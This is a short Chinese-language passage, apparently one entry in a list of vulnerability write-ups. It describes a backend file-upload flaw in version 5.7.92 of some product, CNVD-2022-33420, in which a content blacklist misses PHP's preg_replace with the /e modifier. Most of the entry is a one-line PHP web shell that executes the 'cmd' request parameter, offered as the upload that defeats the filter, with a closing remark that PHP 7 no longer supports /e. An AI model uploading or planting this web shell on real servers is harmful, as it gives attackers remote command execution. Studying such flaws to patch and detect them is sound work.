**17、5.7.92版本后台文件上传漏洞（CNVD-2022-33420）**

该漏洞是绕过了对上传文件内容的黑名单过滤，preg\_replace函数不在黑名单内，这个函数是正则匹配函数，但是加了/e修饰符的话，就会执行php代码。

![](../Images/5d54cffd5a67f7c171407be88713fc62.png)

使用下面代码绕过黑名单上传：

*   
*   
*   

```
<?phppreg_replace("/abc/e", $_REQUEST['cmd'], "abcd");?>
```

![](../Images/2fd2888f354b04f32b5cac8cf857d907.png)

但是php7不再支持preg\_replace的/e修饰符。
